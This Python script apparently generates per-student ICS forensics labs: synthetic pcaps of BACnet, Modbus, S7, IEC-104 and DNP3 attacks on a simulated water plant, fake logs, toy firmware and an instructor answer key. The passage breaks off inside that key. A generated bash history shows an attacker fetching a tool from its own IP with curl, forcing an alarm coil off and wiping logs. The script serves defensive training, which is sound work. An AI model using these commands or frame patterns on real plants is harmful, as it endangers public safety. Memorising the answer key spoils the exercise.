#!/usr/bin/env python3
"""Sinh bộ artefact cho lớp đào tạo, mỗi học viên một đề riêng.

Mỗi seed tạo ra một kịch bản có cùng cấu trúc nhưng khác giá trị: địa chỉ IP,
mật khẩu, tên zone, setpoint, mốc thời gian. Học viên không chép được đáp án
của nhau, còn giảng viên có file đáp án sinh kèm.

    python3 tao-de/make_lab.py --seed 101 --out lab-101/
    python3 tao-de/make_lab.py --class-list hocvien.txt --out lop-t11/
    python3 tao-de/make_lab.py --seed 101 --out lab-101/ --dap-an

Không có dữ liệu thật trong này: toàn bộ gói tin được dựng thủ công, giá trị
từng trường đều biết trước, nên đáp án luôn khớp với artefact.
"""
from __future__ import annotations

import argparse
import json
import os
import random
import struct
import sys
import zlib

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from pcap_builder import (  # noqa: E402
    PcapWriter, apdu, asdu, bvlc, ctx, dnp3_frame, i_frame, io, mbap, objid,
    s7_ack, s7_job, s7_userdata,
)

# --- kho giá trị để sinh đề -------------------------------------------------
PLANTS = [
    ("Nhà máy nước Bình Minh", "BINHMINH"),
    ("Trạm bơm Hòa Phước", "HOAPHUOC"),
    ("Nhà máy nước Tân Lộc", "TANLOC"),
    ("Trạm xử lý Vĩnh Yên", "VINHYEN"),
    ("Nhà máy nước Cẩm Giang", "CAMGIANG"),
]
ZONES = ["kho-hoachat", "phong-dieu-khien", "cua-chinh", "tram-bom",
         "phong-may-chu", "khu-be-lang"]
WEAK_PASSWORDS = ["admin", "bacnet", "service", "letmein", "123456", "operator",
                  "guest", "default"]
SERVICE_USERS = ["svc_hmi", "svc_scada", "opcuser", "hmi_svc", "scada_svc"]
TOOL_NAMES = ["mbtool.py", "plcprobe.py", "bacscan.py", "otclient.py"]


def q(value: float) -> float:
    """Làm tròn về bội của 0.25.

    Một giá trị như 64.6 không biểu diễn chính xác được bằng float 32 bit, nên
    công cụ sẽ in ra 64.599998 và đáp án sẽ lệch so với bài làm. Bội của 0.25
    thì chính xác tuyệt đối.
    """
    return round(value * 4) / 4


def rng_values(seed: int) -> dict:
    """Toàn bộ tham số của một đề, suy ra từ seed."""
    r = random.Random(seed)
    plant_vn, plant_en = r.choice(PLANTS)
    base_ot = f"10.{r.randint(20, 60)}.{r.randint(1, 60)}"
    base_it = f"172.{r.randint(16, 31)}.{r.randint(1, 40)}"
    zones = r.sample(ZONES, 3)
    good_pw = f"{plant_en.capitalize()}{r.randint(10, 99)}!"
    wrong = r.sample(WEAK_PASSWORDS, 4)
    return {
        "seed": seed,
        "plant_vn": plant_vn,
        "plant_en": plant_en,
        # BACnet
        "bms_controller": f"{base_ot}.10",
        "bms_zone_ips": [f"{base_ot}.{11 + i}" for i in range(3)],
        "bms_operator": f"{base_ot}.5",
        "attacker_ot": f"{base_ot}.{r.randint(70, 99)}",
        "dcc_password": good_pw,
        "dcc_wrong": wrong,
        "zones": zones,
        "door_objects": [10 + i for i in range(3)],
        "sensor_objects": [30 + i for i in range(3)],
        # Modbus
        "modbus_plc": f"{base_it}.10",
        "modbus_hmi": f"{base_it}.20",
        "modbus_attacker": f"{base_it}.{r.randint(90, 120)}",
        "alarm_coil": r.choice([13, 17, 21, 25]),
        "setpoint_reg": r.choice([40, 44, 48]),
        "new_setpoint": q(r.uniform(55.0, 95.0)),
        "tank_level": q(r.uniform(30.0, 70.0)),
        "scan_units": r.randint(5, 9),
        # S7
        "s7_plc": f"{base_ot}.{r.randint(100, 120)}",
        "s7_plc2": f"{base_ot}.{r.randint(121, 140)}",
        "s7_eng": f"{base_ot}.{r.randint(141, 160)}",
        "s7_attacker": f"{base_ot}.{r.randint(161, 180)}",
        "szl_ids": sorted(r.sample([0x0011, 0x001C, 0x0424, 0x00A0, 0x0232], 3)),
        "blocks": r.sample([("08", 1, "OB1"), ("0A", 5, "DB5"), ("0E", 12, "FB12"),
                            ("0C", 7, "FC7"), ("0A", 21, "DB21")], 3),
        "chlorine_old": q(r.uniform(0.8, 1.8)),
        "chlorine_new": q(r.uniform(3.5, 6.5)),
        "db_number": r.choice([1, 3, 7]),
        "db_offset": r.choice([2, 6, 10]),
        # IEC-104
        "iec_master": f"{base_ot}.{r.randint(181, 190)}",
        "iec_rtu": f"{base_ot}.{r.randint(191, 199)}",
        "iec_ca": r.choice([1, 2, 7, 11]),
        "ioa_pump": r.choice([2001, 2101, 2201]),
        "ioa_valve": r.choice([2002, 2102, 2202]),
        "ioa_setpoint": r.choice([3001, 3101, 3201]),
        "iec_setpoint": q(r.uniform(80.0, 99.0)),
        # IT / jump host
        "jumpbox": f"{base_it}.100",
        "sql_server": f"{base_it}.40",
        "attacker_it": f"{base_it}.{r.randint(200, 250)}",
        "service_user": r.choice(SERVICE_USERS),
        "new_account": r.choice(["maint", "backup", "support", "tech"]),
        "sql_password": f"{plant_en}@{r.randint(1000, 9999)}",
        "ftp_password": f"Mua{r.choice(['Xuan', 'He', 'Thu', 'Dong'])}{r.randint(2020, 2026)}!",
        "snmp_community": r.choice(["private", "public1", "ot-rw", "scada"]),
        "tool_name": r.choice(TOOL_NAMES),
        # firmware
        "rom_title": plant_en[:10],
        "pump_tag": f"P-{r.randint(100, 199)}",
        "valve_tag": f"FCV-{r.randint(1, 9)}",
        "rom_old_limit": q(r.uniform(1.0, 2.0)),
        "rom_new_limit": q(r.uniform(8.0, 12.0)),
        # mốc thời gian
        "t0": 1762000000 + seed * 3600,
    }


# ---------------------------------------------------------------------------
# các artefact
# ---------------------------------------------------------------------------
def lab_bacnet(path: str, v: dict) -> dict:
    """Kịch bản: kẻ tấn công vô hiệu hoá BMS rồi mở cửa và làm mù cảm biến."""
    w = PcapWriter(path)
    w.t = float(v["t0"])
    atk, bc = v["attacker_ot"], v["bms_controller"]
    zones = v["bms_zone_ips"]
    frames = {}

    for i, z in enumerate(zones):                       # lưu lượng bình thường
        req = bytes([0x00, 0x05, 10 + i, 0x0C]) + ctx(0, objid(4, 1 + i)) \
            + ctx(1, bytes([85]))
        w.udp(v["bms_operator"], z, 47808, 47808, bvlc(req))
        ack = bytes([0x30, 10 + i, 0x0C]) + ctx(0, objid(4, 1 + i)) \
            + ctx(1, bytes([85])) + b"\x3e\x91\x00\x3f"
        w.udp(z, v["bms_operator"], 47808, 47808, bvlc(ack))

    w.udp(atk, v["bms_controller"].rsplit(".", 1)[0] + ".255", 47808, 47808,
          bvlc(b"\x10\x08", func=0x0B))
    frames["who_is"] = w.count
    for i, z in enumerate([bc] + zones):
        iam = b"\x10\x00\xc4" + objid(8, 900 + i) + b"\x22\x01\xe0\x91\x00\x21\x63"
        w.udp(z, atk, 47808, 47808, bvlc(iam))

    attempts = 0
    for n, pw in enumerate(v["dcc_wrong"] + [v["dcc_password"]]):
        body = ctx(1, bytes([0x01])) + bytes([0x2D, len(pw) + 1, 0x00]) + pw.encode()
        w.udp(atk, bc, 47808, 47808, bvlc(bytes([0x00, 0x05, 20 + n, 0x11]) + body))
        attempts += 1
        if pw == v["dcc_password"]:
            frames["dcc_success"] = w.count
            w.udp(bc, atk, 47808, 47808, bvlc(bytes([0x20, 20 + n, 0x11])))
        else:
            w.udp(bc, atk, 47808, 47808,
                  bvlc(bytes([0x50, 20 + n, 0x11, 0x91, 0x04, 0x91, 0x1A])))

    for i, z in enumerate(zones):                       # lần lượt từng zone
        pw = v["dcc_password"]
        body = ctx(1, bytes([0x01])) + bytes([0x2D, len(pw) + 1, 0x00]) + pw.encode()
        w.udp(atk, z, 47808, 47808, bvlc(bytes([0x00, 0x05, 40 + i, 0x11]) + body))
        w.udp(z, atk, 47808, 47808, bvlc(bytes([0x20, 40 + i, 0x11])))
        for j, (obj, prop, val) in enumerate((
                (objid(4, v["door_objects"][i]), 85, b"\x91\x01"),
                (objid(4, v["door_objects"][i] + 10), 85, b"\x91\x00"),
                (objid(3, v["sensor_objects"][i]), 81, b"\x91\x01"))):
            iid = 50 + i * 3 + j          # invoke id riêng cho từng yêu cầu
            wp = bytes([0x00, 0x05, iid, 0x0F]) + ctx(0, obj) \
                + ctx(1, bytes([prop])) + b"\x3e" + val + b"\x3f" + ctx(4, bytes([8]))
            w.udp(atk, z, 47808, 47808, bvlc(wp))
            w.udp(z, atk, 47808, 47808, bvlc(bytes([0x20, iid, 0x0F])))

    pw = v["dcc_password"]
    body = ctx(0, bytes([0x01])) + bytes([0x1D, len(pw) + 1, 0x00]) + pw.encode()
    w.udp(atk, bc, 47808, 47808, bvlc(bytes([0x00, 0x05, 70, 0x14]) + body))
    frames["reinit"] = w.count
    w.udp(bc, atk, 47808, 47808, bvlc(bytes([0x20, 70, 0x14])))
    w.close()
    return {"dcc_attempts_first_target": attempts, **frames}


def lab_modbus(path: str, v: dict) -> dict:
    w = PcapWriter(path)
    w.t = float(v["t0"]) + 120
    plc, hmi, atk = v["modbus_plc"], v["modbus_hmi"], v["modbus_attacker"]
    tid = 1
    for _ in range(3):
        w.tcp(hmi, plc, 50100, 502, mbap(tid, 1, struct.pack(">BHH", 3, 0, 10)))
        regs = [int(v["tank_level"] * 10), 0, 48, 0, 1, 0, 300, 0, 75, 0]
        body = struct.pack(">BB", 3, 20) + b"".join(struct.pack(">H", x) for x in regs)
        w.tcp(plc, hmi, 502, 50100, mbap(tid, 1, body))
        tid += 1
    for unit in range(1, v["scan_units"] + 1):          # quét unit id
        w.tcp(atk, plc, 40000 + unit, 502, mbap(tid, unit, struct.pack(">BHH", 3, 0, 1)))
        if unit <= 2:
            w.tcp(plc, atk, 502, 40000 + unit, mbap(tid, unit, struct.pack(">BBH", 3, 2, 999)))
        else:
            w.tcp(plc, atk, 502, 40000 + unit, mbap(tid, unit, b"\x83\x0b"))
        tid += 1
    msg = (v["plant_en"][:14] + " OK").ljust(16).encode()
    regs = [struct.unpack(">H", msg[i:i + 2])[0] for i in range(0, 16, 2)]
    w.tcp(atk, plc, 40100, 502, mbap(tid, 1, struct.pack(">BHH", 4, 100, len(regs))))
    w.tcp(plc, atk, 502, 40100, mbap(tid, 1, struct.pack(">BB", 4, len(regs) * 2)
                                     + b"".join(struct.pack(">H", x) for x in regs)))
    tid += 1
    w.tcp(atk, plc, 40200, 502, mbap(tid, 1, struct.pack(">BHH", 5, v["alarm_coil"], 0x0000)))
    coil_frame = w.count
    w.tcp(plc, atk, 502, 40200, mbap(tid, 1, struct.pack(">BHH", 5, v["alarm_coil"], 0x0000)))
    tid += 1
    hi, lo = struct.unpack(">HH", struct.pack(">f", v["new_setpoint"]))
    w.tcp(atk, plc, 40201, 502,
          mbap(tid, 1, struct.pack(">BHHB", 16, v["setpoint_reg"], 2, 4)
               + struct.pack(">HH", hi, lo)))
    sp_frame = w.count
    w.tcp(plc, atk, 502, 40201, mbap(tid, 1, struct.pack(">BHH", 16, v["setpoint_reg"], 2)))
    w.close()
    return {"coil_frame": coil_frame, "setpoint_frame": sp_frame,
            "hidden_text": msg.decode().strip()}


def lab_s7(path: str, v: dict) -> dict:
    w = PcapWriter(path)
    w.t = float(v["t0"]) + 300
    atk, plc1, plc2 = v["s7_attacker"], v["s7_plc"], v["s7_plc2"]
    cr = struct.pack(">BBH", 0x03, 0x00, 22) + \
        b"\x12\xe0\x00\x00\x00\x01\x00\xc1\x02\x01\x00\xc2\x02\x01\x02\xc0\x01\x0a"
    w.tcp(atk, plc1, 50001, 102, cr)
    w.tcp(plc1, atk, 102, 50001,
          struct.pack(">BBH", 0x03, 0x00, 11) + b"\x06\xd0\x00\x01\x00\x01\x00")
    w.tcp(atk, plc1, 50001, 102, s7_job(1, b"\xf0\x00\x00\x01\x00\x01\x01\xe0"))
    w.tcp(plc1, atk, 102, 50001, s7_ack(1, b"\xf0\x00\x00\x01\x00\x01\x00\xf0"))
    for i, szl in enumerate(v["szl_ids"]):
        data = b"\xff\x09\x00\x04" + struct.pack(">HH", szl, 0x0000)
        w.tcp(atk, plc1, 50001, 102, s7_userdata(10 + i, 0x04, 0x01, data))
        w.tcp(plc1, atk, 102, 50001, s7_userdata(10 + i, 0x04, 0x01, data + b"\x00" * 8))
    addr = (v["db_offset"] * 8)
    item = b"\x12\x0a\x10\x07\x00\x01" + struct.pack(">H", v["db_number"]) \
        + b"\x84" + addr.to_bytes(3, "big")
    w.tcp(atk, plc1, 50001, 102, s7_job(20, b"\x04\x01" + item))
    w.tcp(plc1, atk, 102, 50001,
          s7_ack(20, b"\x04\x01", b"\xff\x07\x00\x20" + struct.pack(">f", v["chlorine_old"])))
    w.tcp(atk, plc1, 50001, 102,
          s7_job(21, b"\x05\x01" + item,
                 b"\x00\x07\x00\x20" + struct.pack(">f", v["chlorine_new"])))
    write_frame = w.count
    w.tcp(plc1, atk, 102, 50001, s7_ack(21, b"\x05\x01", b"\xff"))
    for code, num, _name in v["blocks"]:
        fname = f"_{code}{num:05d}P"
        w.tcp(atk, plc1, 50001, 102,
              s7_job(30, b"\x1a\x00\x00\x00\x00\x00\x09" + fname.encode()))
        w.tcp(plc1, atk, 102, 50001, s7_ack(30, b"\x1a\x00"))
    stop_frames = []
    for plc in (plc1, plc2):
        w.tcp(atk, plc, 50001, 102, s7_job(40, b"\x29\x00\x00\x00\x00\x09P_PROGRAM"))
        stop_frames.append(w.count)
        w.tcp(plc, atk, 102, 50001, s7_ack(40, b"\x29\x00", b"", err=0x8104))
    w.close()
    return {"write_frame": write_frame, "stop_frames": stop_frames,
            "blocks": [b[2] for b in v["blocks"]]}


def lab_iec104(path: str, v: dict) -> dict:
    w = PcapWriter(path)
    w.t = float(v["t0"]) + 600
    m, rtu, ca = v["iec_master"], v["iec_rtu"], v["iec_ca"]
    w.tcp(m, rtu, 51000, 2404, apdu(b"\x07\x00\x00\x00"))
    w.tcp(rtu, m, 2404, 51000, apdu(b"\x0b\x00\x00\x00"))
    w.tcp(m, rtu, 51000, 2404, i_frame(0, 0, asdu(100, 6, ca, io(0, b"\x14"))))
    w.tcp(rtu, m, 2404, 51000, i_frame(0, 1, asdu(100, 7, ca, io(0, b"\x14"))))
    vals = b"".join(io(100 + i, struct.pack("<f", x) + b"\x00")
                    for i, x in enumerate((v["tank_level"] / 10, 61.4, 0.84)))
    w.tcp(rtu, m, 2404, 51000, i_frame(1, 1, asdu(13, 20, ca, vals, num=3)))
    # chuỗi đúng: select -> execute
    w.tcp(m, rtu, 51000, 2404, i_frame(1, 2, asdu(45, 6, ca, io(v["ioa_pump"], b"\x81"))))
    w.tcp(rtu, m, 2404, 51000, i_frame(2, 2, asdu(45, 7, ca, io(v["ioa_pump"], b"\x81"))))
    w.tcp(m, rtu, 51000, 2404, i_frame(2, 3, asdu(45, 6, ca, io(v["ioa_pump"], b"\x01"))))
    w.tcp(rtu, m, 2404, 51000, i_frame(3, 3, asdu(45, 7, ca, io(v["ioa_pump"], b"\x01"))))
    w.tcp(rtu, m, 2404, 51000, i_frame(4, 3, asdu(45, 10, ca, io(v["ioa_pump"], b"\x01"))))
    # lỗi 1: execute không select
    w.tcp(m, rtu, 51000, 2404, i_frame(3, 5, asdu(45, 6, ca, io(v["ioa_valve"], b"\x00"))))
    no_select_frame = w.count
    # lỗi 2: setpoint bị từ chối
    sp = struct.pack("<f", v["iec_setpoint"]) + b"\x00"
    w.tcp(m, rtu, 51000, 2404, i_frame(4, 5, asdu(50, 6, ca, io(v["ioa_setpoint"], sp))))
    w.tcp(rtu, m, 2404, 51000,
          i_frame(5, 5, asdu(50, 7, ca, io(v["ioa_setpoint"], sp), negative=True)))
    refused_frame = w.count
    # lỗi 3: select treo + STOPDT
    w.tcp(m, rtu, 51000, 2404, i_frame(5, 6, asdu(46, 6, ca, io(v["ioa_valve"] + 1, b"\x82"))))
    w.tcp(m, rtu, 51000, 2404, apdu(b"\x13\x00\x00\x00"))
    stopdt_frame = w.count
    w.close()
    return {"no_select_frame": no_select_frame, "refused_frame": refused_frame,
            "stopdt_frame": stopdt_frame}


def lab_dnp3(path: str, v: dict) -> dict:
    w = PcapWriter(path)
    w.t = float(v["t0"]) + 900
    master = v["iec_master"]
    out = v["iec_rtu"]
    w.tcp(master, out, 52000, 20000, dnp3_frame(1, 10, b"\xc0\x01\x3c\x01\x06"))
    w.tcp(out, master, 20000, 52000,
          dnp3_frame(10, 1, b"\xc0\x81\x80\x00\x01\x02\x00\x00\x07\x01"))
    crob = b"\x0c\x01\x17\x01\x05\x03\x01" + struct.pack("<II", 100, 0) + b"\x00"
    w.tcp(master, out, 52000, 20000, dnp3_frame(1, 10, b"\xc1\x05" + crob))
    crob_frame = w.count
    w.tcp(master, out, 52000, 20000, dnp3_frame(1, 10, b"\xc2\x15"))
    w.tcp(master, out, 52000, 20000, dnp3_frame(1, 10, b"\xc3\x0d"))
    w.close()
    return {"crob_frame": crob_frame}


def lab_creds(path: str, v: dict) -> dict:
    w = PcapWriter(path)
    w.t = float(v["t0"]) + 60
    jump, sql = v["jumpbox"], v["sql_server"]
    user, pw = v["service_user"], v["sql_password"]

    def enc(s: str) -> bytes:
        return s.encode("utf-16-le")

    def obf(s: str) -> bytes:
        out = bytearray()
        for b in enc(s):
            b = ((b & 0x0F) << 4) | (b >> 4)
            out.append(b ^ 0xA5)
        return bytes(out)

    fixed = bytearray(94)
    parts, off = [], 94
    for name, blob in (("host", enc("JUMPBOX01")), ("user", enc(user)),
                       ("pass", obf(pw)), ("app", enc("HMI")),
                       ("server", enc("SQLHIST")), ("unused", b""),
                       ("lib", enc("ODBC")), ("lang", b""),
                       ("db", enc(v["plant_en"]))):
        parts.append((name, off, len(blob) // 2, blob))
        off += len(blob)
    pos = {"host": 36, "user": 40, "pass": 44, "app": 48, "server": 52,
           "unused": 56, "lib": 60, "lang": 64, "db": 68}
    for name, o, ln, _ in parts:
        struct.pack_into("<HH", fixed, pos[name], o, ln)
    body = bytes(fixed) + b"".join(p[3] for p in parts)
    struct.pack_into("<I", fixed, 0, len(body))
    body = bytes(fixed) + b"".join(p[3] for p in parts)
    w.tcp(jump, sql, 51515, 1433,
          struct.pack(">BBHHBB", 0x10, 0x01, 8 + len(body), 0, 1, 0) + body)
    tds_frame = w.count
    q = (f"SELECT tagname, value FROM dbo.ProcessTags "
         f"WHERE area='{v['plant_en']}'")
    w.tcp(jump, sql, 51515, 1433,
          struct.pack(">BBHHBB", 0x01, 0x01, 8 + len(q) * 2, 0, 1, 0)
          + q.encode("utf-16-le"))
    w.tcp(jump, sql, 51516, 21, b"USER operator\r\n")
    w.tcp(jump, sql, 51516, 21, f"PASS {v['ftp_password']}\r\n".encode())
    ftp_frame = w.count
    comm = v["snmp_community"].encode()
    snmp = (b"\x30" + bytes([0x1e + len(comm)]) + b"\x02\x01\x00\x04"
            + bytes([len(comm)]) + comm
            + b"\xa0\x17\x02\x04\x00\x00\x00\x01\x02\x01\x00\x02\x01\x00"
            + b"\x30\x09\x30\x07\x06\x03\x2b\x06\x01\x05\x00")
    w.udp(jump, sql, 51517, 161, snmp)
    w.close()
    return {"tds_frame": tds_frame, "ftp_frame": ftp_frame}


def lab_logs(auth_path: str, hist_path: str, v: dict) -> dict:
    import datetime as dt
    t0 = dt.datetime.fromtimestamp(v["t0"], dt.timezone.utc)

    def stamp(offset: int) -> str:
        return (t0 + dt.timedelta(seconds=offset)).strftime("%b %d %H:%M:%S")

    atk = v["attacker_it"]
    user, newacct = v["service_user"], v["new_account"]
    lines = [
        f"{stamp(-120)} jumpbox sshd[2211]: Failed password for invalid user admin from {atk} port 51122 ssh2",
        f"{stamp(-116)} jumpbox sshd[2211]: Failed password for invalid user admin from {atk} port 51126 ssh2",
        f"{stamp(-112)} jumpbox sshd[2213]: Invalid user {user} from {atk}",
        f"{stamp(-60)} jumpbox sshd[2217]: Accepted password for {user} from {atk} port 51140 ssh2",
        f"{stamp(-58)} jumpbox systemd-logind[640]: New session 42 of user {user}.",
        f"{stamp(-50)} jumpbox sudo:  {user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND=/usr/bin/apt-get install -y python3-pymodbus",
        f"{stamp(-40)} jumpbox useradd[2240]: new user: name={newacct}, UID=1004, GID=1004, home=/home/{newacct}, shell=/bin/bash",
        f"{stamp(-38)} jumpbox usermod[2242]: add '{newacct}' to group 'sudo'",
        f"{stamp(-20)} jumpbox sshd[2250]: Accepted publickey for {newacct} from {atk} port 51190 ssh2",
        f"{stamp(1200)} jumpbox systemd[1]: Stopped Historian Collector Service.",
    ]
    with open(auth_path, "w") as fh:
        fh.write("\n".join(lines) + "\n")

    entries = [
        (v["t0"] - 110, "id"),
        (v["t0"] - 100, "cat /etc/hosts"),
        (v["t0"] - 80, f"curl -s http://{atk}:8000/{v['tool_name']} -o /tmp/{v['tool_name']}"),
        (v["t0"] - 30, f"nmap -Pn -p 502,102,47808,2404 {v['modbus_plc'].rsplit('.', 1)[0]}.0/24"),
        (v["t0"] + 150, f"python3 /tmp/{v['tool_name']} --write-coil {v['alarm_coil']} 0 {v['modbus_plc']}"),
        (v["t0"] + 1300, "echo '' > ~/.bash_history"),
        (v["t0"] + 1310, "rm -f /var/log/auth.log.1"),
    ]
    with open(hist_path, "w") as fh:
        for ts, cmd in entries:
            fh.write(f"#{ts}\n{cmd}\n")
    return {"auth_year": t0.year, "ssh_user": user, "new_account": newacct}


NINTENDO_LOGO = bytes([
    0xCE, 0xED, 0x66, 0x66, 0xCC, 0x0D, 0x00, 0x0B, 0x03, 0x73, 0x00, 0x83,
    0x00, 0x0C, 0x00, 0x0D, 0x00, 0x08, 0x11, 0x1F, 0x88, 0x89, 0x00, 0x0E,
    0xDC, 0xCC, 0x6E, 0xE6, 0xDD, 0xDD, 0xD9, 0x99, 0xBB, 0xBB, 0x67, 0x63,
    0x6E, 0x0E, 0xEC, 0xCC, 0xDD, 0xDC, 0x99, 0x9F, 0xBB, 0xB9, 0x33, 0x3E])


def _fix_checksums(rom: bytearray) -> None:
    s = 0
    for b in rom[0x134:0x14D]:
        s = (s - b - 1) & 0xFF
    rom[0x14D] = s
    g = (sum(rom) - rom[0x14E] - rom[0x14F]) & 0xFFFF
    rom[0x14E:0x150] = g.to_bytes(2, "big")


def lab_rom(path_v1: str, path_v2: str, v: dict) -> dict:
    rom = bytearray(b"\xff" * (64 * 1024))
    rom[0x100:0x104] = b"\x00\xc3\x50\x01"
    rom[0x104:0x134] = NINTENDO_LOGO
    title = v["rom_title"].upper().encode().ljust(16, b"\x00")
    rom[0x134:0x144] = title[:16]
    rom[0x143] = 0x00
    rom[0x147] = 0x13
    rom[0x148] = 0x01
    rom[0x149] = 0x03
    rom[0x14A] = 0x01
    rom[0x14B] = 0x33
    text = (f"PUMP {v['pump_tag']}\x00{v['valve_tag']}\x00BREAK TANK\x00"
            "SHIFT COMPLETE\x00PLANT TRIP - LEVEL LOW\x00SERVICE MODE\x00"
            "ENTER KEY SEQUENCE\x00MAINT ARCHIVE\x00").encode()
    rom[0x4000:0x4000 + len(text)] = text
    rom[0x5000:0x5010] = struct.pack("<ffff", v["rom_old_limit"], 4.25, 10.0, 0.5)
    blob = zlib.compress(
        (f"ARCHIVE v1\nca truc {v['plant_en']}\nTOKEN-{v['seed']:04d}\n" * 4).encode())
    rom[0x8000:0x8000 + len(blob)] = blob
    rnd = bytearray()
    x = 0x1234 + v["seed"]
    for _ in range(0x1000):
        x = (x * 1103515245 + 12345) & 0xFFFFFFFF
        rnd.append((x >> 16) & 0xFF)
    rom[0xC000:0xC000 + len(rnd)] = rnd
    _fix_checksums(rom)
    with open(path_v1, "wb") as fh:
        fh.write(rom)

    rom2 = bytearray(rom)
    rom2[0x5000:0x5004] = struct.pack("<f", v["rom_new_limit"])
    newlabel = f"PUMP {v['pump_tag']} MOD\x00".encode()
    rom2[0x4000:0x4000 + len(newlabel)] = newlabel
    _fix_checksums(rom2)
    with open(path_v2, "wb") as fh:
        fh.write(rom2)
    return {"rom_diff_offset": "0x5000", "archive_offset": "0x8000"}


def lab_dos(path: str, v: dict) -> dict:
    code = bytearray()
    code += b"\xb4\x09\xba\x40\x01\xcd\x21"
    code += b"\xb4\x01\xcd\x21"
    code += b"\xb4\x00\xcd\x14"
    code += b"\xb8\x00\x00\xcd\x10"
    code += b"\xb4\x4c\xcd\x21"
    code += b"\x90" * (0x40 - len(code))
    text = (f"{v['plant_en']} SETPOINT UTILITY v1.6$"
            "ENTER NEW CHLORINE SETPOINT (MG/L): $"
            f"ALARM LIMIT EXCEEDED - PUMP {v['pump_tag']} TRIP$"
            "MANUAL MODE ENGAGED$").encode()
    code += text
    code += struct.pack("<ffff", v["chlorine_old"], v["chlorine_new"], 10.0, 0.5)
    with open(path, "wb") as fh:
        fh.write(bytes(code))
    return {"dos_floats": [v["chlorine_old"], v["chlorine_new"]]}


# ---------------------------------------------------------------------------
def build(seed: int, out: str, student: str = "") -> dict:
    os.makedirs(out, exist_ok=True)
    v = rng_values(seed)
    facts = {}
    facts["bacnet"] = lab_bacnet(os.path.join(out, "lab1_bms.pcap"), v)
    facts["modbus"] = lab_modbus(os.path.join(out, "lab2_modbus.pcap"), v)
    facts["s7"] = lab_s7(os.path.join(out, "lab3_s7.pcap"), v)
    facts["iec104"] = lab_iec104(os.path.join(out, "lab4_iec104.pcap"), v)
    facts["dnp3"] = lab_dnp3(os.path.join(out, "lab4_dnp3.pcap"), v)
    facts["creds"] = lab_creds(os.path.join(out, "lab5_dmz.pcap"), v)
    facts["logs"] = lab_logs(os.path.join(out, "lab6_auth.log"),
                             os.path.join(out, "lab6_bash_history"), v)
    facts["rom"] = lab_rom(os.path.join(out, "lab7_rig_v1.gb"),
                           os.path.join(out, "lab7_rig_v2.gb"), v)
    facts["dos"] = lab_dos(os.path.join(out, "lab7_setpoint.com"), v)

    with open(os.path.join(out, "DE-BAI.txt"), "w") as fh:
        fh.write(f"""BO DE THUC HANH - ics-toolkit
mã đề: {seed}{('  |  học viên: ' + student) if student else ''}
nhà máy mô phỏng: {v['plant_vn']}

lab1_bms.pcap          Lab 1 - BACnet/IP
lab2_modbus.pcap       Lab 2 - Modbus/TCP
lab3_s7.pcap           Lab 3 - S7comm
lab4_iec104.pcap       Lab 4 - IEC 60870-5-104
lab4_dnp3.pcap         Lab 4 (mở rộng) - DNP3
lab5_dmz.pcap          Lab 5 - thông tin đăng nhập dạng rõ
lab6_auth.log          Lab 6 - log hệ thống
lab6_bash_history      Lab 6 - lịch sử lệnh
lab7_rig_v1.gb         Lab 7 - firmware bản gốc
lab7_rig_v2.gb         Lab 7 - firmware bản đã sửa
lab7_setpoint.com      Lab 7 - tiện ích HMI 16-bit

Toàn bộ dữ liệu là mô phỏng. Không có thiết bị thật nào bị tác động.
Câu hỏi của từng lab nằm trong các file 02..09-*.md của bộ tài liệu.
""")
    return {"seed": seed, "student": student, "values": v, "facts": facts}


def write_answer_key(info: dict, path: str) -> None:
    v, f = info["values"], info["facts"]
    lines = [
        f"# Đáp án - mã đề {info['seed']}",
        "",
        "> Chỉ dành cho giảng viên. Không phát cho học viên.",
        "",
        f"Nhà máy mô phỏng: **{v['plant_vn']}**"
        + (f" | học viên: **{info['student']}**" if info["student"] else ""),
        "",
        "## Lab 1 - BACnet/IP",
        "",
        "| Câu | Đáp án |",
        "|---|---|",
        f"| IP thiết bị lạ | `{v['attacker_ot']}` |",
        f"| Số lần thử DCC vào Building Controller | **{f['bacnet']['dcc_attempts_first_target']}** "
        f"({len(v['dcc_wrong'])} lần sai + 1 lần đúng). Lưu ý: bảng *attempts per pair* "
        f"của tool hiển thị {f['bacnet']['dcc_attempts_first_target'] + 1} vì gộp cả "
        "`reinitializeDevice` cuối phiên - học viên phải tách hai dịch vụ ra |",
        f"| Mật khẩu DCC đúng | `{v['dcc_password']}` |",
        f"| Mật khẩu đã thử và bị từ chối | {', '.join('`' + p + '`' for p in v['dcc_wrong'])} |",
        f"| Ba zone bị tấn công, theo thứ tự | {', '.join(v['zones'])} "
        f"(tương ứng IP {', '.join(v['bms_zone_ips'])}) |",
        f"| Object bị ghi ở zone đầu tiên | `BO:{v['door_objects'][0]}` (khoá cửa), "
        f"`BO:{v['door_objects'][0] + 10}` (chiếu sáng), "
        f"`BI:{v['sensor_objects'][0]}` (cảm biến) |",
        "| Thuộc tính bị ghi lên cảm biến | `out-of-service` (= 1), priority 8 |",
        "| Dịch vụ cuối cùng dùng với Building Controller | `reinitializeDevice` "
        f"(warmstart), frame {f['bacnet'].get('reinit', '-')} |",
        "",
        "## Lab 2 - Modbus/TCP",
        "",
        "| Câu | Đáp án |",
        "|---|---|",
        f"| IP quét | `{v['modbus_attacker']}` |",
        f"| Số unit id bị quét | {v['scan_units']} (chỉ unit 1-2 trả lời, còn lại exception 11) |",
        f"| Coil bị ép về 0 | coil **{v['alarm_coil']}** (function 5), frame {f['modbus']['coil_frame']} |",
        f"| Thanh ghi bị ghi | **4x{v['setpoint_reg']}-{v['setpoint_reg'] + 1}** (function 16), "
        f"frame {f['modbus']['setpoint_frame']} |",
        f"| Giá trị setpoint mới | **{v['new_setpoint']}** (big-endian ABCD; word-swap cho ra số vô lý) |",
        f"| Chuỗi ASCII giấu trong input register | `{f['modbus']['hidden_text']}` (3x100 trở đi) |",
        "",
        "## Lab 3 - S7comm",
        "",
        "| Câu | Đáp án |",
        "|---|---|",
        f"| IP máy tấn công | `{v['s7_attacker']}` |",
        f"| Các SZL-ID đã đọc | {', '.join(f'`0x{x:04x}`' for x in v['szl_ids'])} |",
        f"| Khối logic bị tải vào PLC | {', '.join('`' + b + '`' for b in f['s7']['blocks'])} |",
        f"| Tag bị ghi | `DB{v['db_number']}.DBX{v['db_offset']}.0` |",
        f"| Giá trị cũ → mới | **{v['chlorine_old']}** → **{v['chlorine_new']}** mg/L "
        f"(IEEE-754 big-endian), frame {f['s7']['write_frame']} |",
        "| Lệnh CPU STOP có thành công không | Không. PLC trả về error class 0x81 code 0x04 "
